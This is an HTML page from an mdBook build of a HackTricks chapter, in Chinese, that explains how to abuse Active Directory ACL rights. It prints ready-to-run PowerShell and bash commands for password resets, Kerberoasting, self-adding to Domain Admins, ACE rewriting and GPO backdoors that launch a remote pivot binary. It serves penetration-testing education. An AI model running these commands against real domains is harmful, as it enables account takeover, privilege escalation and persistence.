@@ -1,0 +1,355 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Abusing Active Directory ACLs/ACEs</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../favicon.png">
+        <link rel="stylesheet" href="../../../css/variables.css">
+        <link rel="stylesheet" href="../../../css/general.css">
+        <link rel="stylesheet" href="../../../css/chrome.css">
+        <link rel="stylesheet" href="../../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../../highlight.css">
+        <link rel="stylesheet" href="../../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="滥用-active-directory-aclsaces"><a class="header" href="#滥用-active-directory-aclsaces">滥用 Active Directory ACLs/ACEs</a></h1>
+<p>{% hint style="success" %}
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <strong>上关注我们</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+<p><strong>本页面主要总结了来自</strong> <a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces"><strong>https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces</strong></a> <strong>和</strong> <a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges"><strong>https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges</strong></a><strong>的技术总结。有关更多详细信息，请查看原始文章。</strong></p>
+<h2 id="用户的-genericall-权限"><a class="header" href="#用户的-genericall-权限"><strong>用户的 GenericAll 权限</strong></a></h2>
+<p>此权限授予攻击者对目标用户帐户的完全控制。一旦使用 <code>Get-ObjectAcl</code> 命令确认了 <code>GenericAll</code> 权限，攻击者可以：</p>
+<ul>
+<li><strong>更改目标的密码</strong>：使用 <code>net user &lt;username&gt; &lt;password&gt; /domain</code>，攻击者可以重置用户的密码。</li>
+<li><strong>针对性 Kerberoasting</strong>：将 SPN 分配给用户帐户，使其可进行 Kerberoasting，然后使用 Rubeus 和 targetedKerberoast.py 提取并尝试破解票证授予票证 (TGT) 哈希。</li>
+</ul>
+<pre><code class="language-powershell">Set-DomainObject -Credential $creds -Identity &lt;username&gt; -Set @{serviceprincipalname="fake/NOTHING"}
+.\Rubeus.exe kerberoast /user:&lt;username&gt; /nowrap
+Set-DomainObject -Credential $creds -Identity &lt;username&gt; -Clear serviceprincipalname -Verbose
+</code></pre>
+<ul>
+<li><strong>针对 ASREPRoasting</strong>: 禁用用户的预身份验证，使其账户容易受到 ASREPRoasting 攻击。</li>
+</ul>
+<pre><code class="language-powershell">Set-DomainObject -Identity &lt;username&gt; -XOR @{UserAccountControl=4194304}
+</code></pre>
+<h2 id="genericall-权限在组上"><a class="header" href="#genericall-权限在组上"><strong>GenericAll 权限在组上</strong></a></h2>
+<p>此权限允许攻击者操纵组成员资格，如果他们在像 <code>Domain Admins</code> 这样的组上拥有 <code>GenericAll</code> 权限。在使用 <code>Get-NetGroup</code> 确定组的区分名称后，攻击者可以：</p>
+<ul>
+<li><strong>将自己添加到 Domain Admins 组</strong>：这可以通过直接命令或使用像 Active Directory 或 PowerSploit 这样的模块来完成。</li>
+</ul>
+<pre><code class="language-powershell">net group "domain admins" spotless /add /domain
+Add-ADGroupMember -Identity "domain admins" -Members spotless
+Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
+</code></pre>
+<h2 id="genericall--genericwrite--write-on-computeruser"><a class="header" href="#genericall--genericwrite--write-on-computeruser"><strong>GenericAll / GenericWrite / Write on Computer/User</strong></a></h2>
+<p>持有这些权限在计算机对象或用户帐户上允许：</p>
+<ul>
+<li><strong>Kerberos 基于资源的受限委派</strong>：允许接管计算机对象。</li>
+<li><strong>影子凭证</strong>：使用此技术通过利用创建影子凭证的权限来冒充计算机或用户帐户。</li>
+</ul>
+<h2 id="writeproperty-on-group"><a class="header" href="#writeproperty-on-group"><strong>WriteProperty on Group</strong></a></h2>
+<p>如果用户对特定组（例如，<code>Domain Admins</code>）的所有对象具有 <code>WriteProperty</code> 权限，他们可以：</p>
+<ul>
+<li><strong>将自己添加到域管理员组</strong>：通过结合使用 <code>net user</code> 和 <code>Add-NetGroupUser</code> 命令实现，此方法允许在域内提升权限。</li>
+</ul>
+<pre><code class="language-powershell">net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
+</code></pre>
+<h2 id="自我自我成员在组中"><a class="header" href="#自我自我成员在组中"><strong>自我（自我成员）在组中</strong></a></h2>
+<p>此权限使攻击者能够通过直接操纵组成员资格的命令将自己添加到特定组，例如 <code>Domain Admins</code>。使用以下命令序列可以实现自我添加：</p>
+<pre><code class="language-powershell">net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
+</code></pre>
+<h2 id="writeproperty-自我成员资格"><a class="header" href="#writeproperty-自我成员资格"><strong>WriteProperty (自我成员资格)</strong></a></h2>
+<p>一个类似的权限，这允许攻击者通过修改组属性直接将自己添加到组中，如果他们在这些组上拥有 <code>WriteProperty</code> 权限。此权限的确认和执行通过以下方式进行：</p>
+<pre><code class="language-powershell">Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
+net group "domain admins" spotless /add /domain
+</code></pre>
+<h2 id="forcechangepassword"><a class="header" href="#forcechangepassword"><strong>ForceChangePassword</strong></a></h2>
+<p>持有用户的 <code>User-Force-Change-Password</code> 的 <code>ExtendedRight</code> 允许在不知道当前密码的情况下重置密码。可以通过 PowerShell 或其他命令行工具验证此权限及其利用，提供多种重置用户密码的方法，包括交互式会话和非交互式环境中的单行命令。这些命令从简单的 PowerShell 调用到在 Linux 上使用 <code>rpcclient</code>，展示了攻击向量的多样性。</p>
+<pre><code class="language-powershell">Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
+Set-DomainUserPassword -Identity delegate -Verbose
+Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+</code></pre>
+<pre><code class="language-bash">rpcclient -U KnownUsername 10.10.10.192
+&gt; setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
+</code></pre>
+<h2 id="writeowner-权限在组上"><a class="header" href="#writeowner-权限在组上"><strong>WriteOwner 权限在组上</strong></a></h2>
+<p>如果攻击者发现他们对一个组拥有 <code>WriteOwner</code> 权限，他们可以将该组的所有权更改为自己。这在该组是 <code>Domain Admins</code> 时尤其具有影响力，因为更改所有权允许对组属性和成员资格进行更广泛的控制。该过程涉及通过 <code>Get-ObjectAcl</code> 确定正确的对象，然后使用 <code>Set-DomainObjectOwner</code> 修改所有者，可以通过 SID 或名称进行修改。</p>
+<pre><code class="language-powershell">Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
+Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
+Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
+</code></pre>
+<h2 id="genericwrite-on-user"><a class="header" href="#genericwrite-on-user"><strong>GenericWrite on User</strong></a></h2>
+<p>此权限允许攻击者修改用户属性。具体来说，拥有 <code>GenericWrite</code> 访问权限的攻击者可以更改用户的登录脚本路径，以便在用户登录时执行恶意脚本。这是通过使用 <code>Set-ADObject</code> 命令将目标用户的 <code>scriptpath</code> 属性更新为指向攻击者的脚本来实现的。</p>
+<pre><code class="language-powershell">Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
+</code></pre>
+<h2 id="genericwrite-on-group"><a class="header" href="#genericwrite-on-group"><strong>GenericWrite on Group</strong></a></h2>
+<p>通过此权限，攻击者可以操纵组成员资格，例如将自己或其他用户添加到特定组中。此过程涉及创建凭据对象，使用它来添加或移除用户，并使用 PowerShell 命令验证成员资格更改。</p>
+<pre><code class="language-powershell">$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
+Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
+Get-DomainGroupMember -Identity "Group Name" | Select MemberName
+Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
+</code></pre>
+<h2 id="writedacl--writeowner"><a class="header" href="#writedacl--writeowner"><strong>WriteDACL + WriteOwner</strong></a></h2>
+<p>拥有一个AD对象并对其具有<code>WriteDACL</code>权限使攻击者能够授予自己对该对象的<code>GenericAll</code>权限。这是通过ADSI操作实现的，允许对该对象进行完全控制并能够修改其组成员资格。尽管如此，在尝试使用Active Directory模块的<code>Set-Acl</code> / <code>Get-Acl</code> cmdlets利用这些权限时仍然存在限制。</p>
+<pre><code class="language-powershell">$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
+$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
+$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
+$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
+$ADSI.psbase.commitchanges()
+</code></pre>
+<h2 id="域上的复制-dcsync"><a class="header" href="#域上的复制-dcsync"><strong>域上的复制 (DCSync)</strong></a></h2>
+<p>DCSync 攻击利用域上的特定复制权限，模拟域控制器并同步数据，包括用户凭据。这种强大的技术需要像 <code>DS-Replication-Get-Changes</code> 这样的权限，使攻击者能够在没有直接访问域控制器的情况下，从 AD 环境中提取敏感信息。<a href="../dcsync.html"><strong>在这里了解更多关于 DCSync 攻击的信息。</strong></a></p>
+<h2 id="gpo-委派"><a class="header" href="#gpo-委派">GPO 委派 <a href="#gpo-delegation" id="gpo-delegation"></a></a></h2>
+<h3 id="gpo-委派-1"><a class="header" href="#gpo-委派-1">GPO 委派</a></h3>
+<p>委派管理组策略对象 (GPO) 的访问权限可能会带来重大安全风险。例如，如果用户如 <code>offense\spotless</code> 被委派 GPO 管理权限，他们可能拥有 <strong>WriteProperty</strong>、<strong>WriteDacl</strong> 和 <strong>WriteOwner</strong> 等权限。这些权限可能被恶意利用，如使用 PowerView 识别的那样：<code>bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}</code></p>
+<h3 id="枚举-gpo-权限"><a class="header" href="#枚举-gpo-权限">枚举 GPO 权限</a></h3>
+<p>要识别配置错误的 GPO，可以将 PowerSploit 的 cmdlet 链接在一起。这允许发现特定用户有权限管理的 GPO：<code>powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}</code></p>
+<p><strong>应用了特定策略的计算机</strong>：可以解析特定 GPO 应用到哪些计算机，帮助理解潜在影响的范围。<code>powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}</code></p>
+<p><strong>应用于特定计算机的策略</strong>：要查看应用于特定计算机的策略，可以使用 <code>Get-DomainGPO</code> 等命令。</p>
+<p><strong>应用了特定策略的 OU</strong>：可以使用 <code>Get-DomainOU</code> 识别受特定策略影响的组织单位 (OU)。</p>
+<h3 id="滥用-gpo---new-gpoimmediatetask"><a class="header" href="#滥用-gpo---new-gpoimmediatetask">滥用 GPO - New-GPOImmediateTask</a></h3>
+<p>配置错误的 GPO 可以被利用来执行代码，例如，通过创建一个立即的计划任务。这可以用来将用户添加到受影响机器的本地管理员组，从而显著提升权限：</p>
+<pre><code class="language-powershell">New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
+</code></pre>
+<h3 id="grouppolicy-module---abuse-gpo"><a class="header" href="#grouppolicy-module---abuse-gpo">GroupPolicy module - Abuse GPO</a></h3>
+<p>GroupPolicy模块（如果已安装）允许创建和链接新的GPO，并设置首选项，例如注册表值，以在受影响的计算机上执行后门。此方法要求更新GPO，并且用户必须登录计算机以执行：</p>
+<pre><code class="language-powershell">New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
+Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
+</code></pre>
+<h3 id="sharpgpoabuse---滥用-gpo"><a class="header" href="#sharpgpoabuse---滥用-gpo">SharpGPOAbuse - 滥用 GPO</a></h3>
+<p>SharpGPOAbuse 提供了一种滥用现有 GPO 的方法，通过添加任务或修改设置，而无需创建新的 GPO。此工具需要修改现有 GPO 或使用 RSAT 工具创建新的 GPO，然后再应用更改：</p>
+<pre><code class="language-bash">.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
+</code></pre>
+<h3 id="强制策略更新"><a class="header" href="#强制策略更新">强制策略更新</a></h3>
+<p>GPO 更新通常每 90 分钟左右发生一次。为了加快这个过程，特别是在实施更改后，可以在目标计算机上使用 <code>gpupdate /force</code> 命令强制立即更新策略。此命令确保对 GPO 的任何修改在下一个自动更新周期之前立即应用。</p>
+<h3 id="背后的机制"><a class="header" href="#背后的机制">背后的机制</a></h3>
+<p>在检查给定 GPO 的计划任务时，例如 <code>Misconfigured Policy</code>，可以确认添加了诸如 <code>evilTask</code> 的任务。这些任务是通过脚本或命令行工具创建的，旨在修改系统行为或提升权限。</p>
+<p>任务的结构，如 <code>New-GPOImmediateTask</code> 生成的 XML 配置文件所示，概述了计划任务的具体细节，包括要执行的命令及其触发器。该文件表示如何在 GPO 中定义和管理计划任务，提供了一种作为政策执行一部分执行任意命令或脚本的方法。</p>
+<h3 id="用户和组"><a class="header" href="#用户和组">用户和组</a></h3>
+<p>GPO 还允许在目标系统上操纵用户和组的成员资格。通过直接编辑用户和组政策文件，攻击者可以将用户添加到特权组中，例如本地 <code>administrators</code> 组。这是通过委派 GPO 管理权限实现的，允许修改政策文件以包括新用户或更改组成员资格。</p>
+<p>用户和组的 XML 配置文件概述了这些更改是如何实施的。通过向该文件添加条目，可以授予特定用户在受影响系统上的提升权限。这种方法提供了一种通过 GPO 操作直接提升权限的途径。</p>
+<p>此外，还可以考虑其他执行代码或维持持久性的方法，例如利用登录/注销脚本、修改注册表键以实现自动运行、通过 .msi 文件安装软件或编辑服务配置。这些技术提供了通过滥用 GPO 维持访问和控制目标系统的各种途径。</p>
+<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
+<ul>
+<li><a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces">https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces</a></li>
+<li><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges</a></li>
+<li><a href="https://wald0.com/?p=112">https://wald0.com/?p=112</a></li>
+<li><a href="https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2">https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2</a></li>
+<li><a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/">https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/</a></li>
+<li><a href="https://adsecurity.org/?p=3658">https://adsecurity.org/?p=3658</a></li>
+<li><a href="https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_">https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_</a></li>
+</ul>
+<p>{% hint style="success" %}
+Learn &amp; practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+Learn &amp; practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>Support HackTricks</summary>
+<ul>
+<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
+<li><strong>Join the</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
+</ul>
+</details>
+{% endhint %}
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../windows-hardening/active-directory-methodology/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../windows-hardening/active-directory-methodology/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../../elasticlunr.min.js"></script>
+        <script src="../../../mark.min.js"></script>
+        <script src="../../../searcher.js"></script>
+
+        <script src="../../../clipboard.min.js"></script>
+        <script src="../../../highlight.js"></script>
+        <script src="../../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
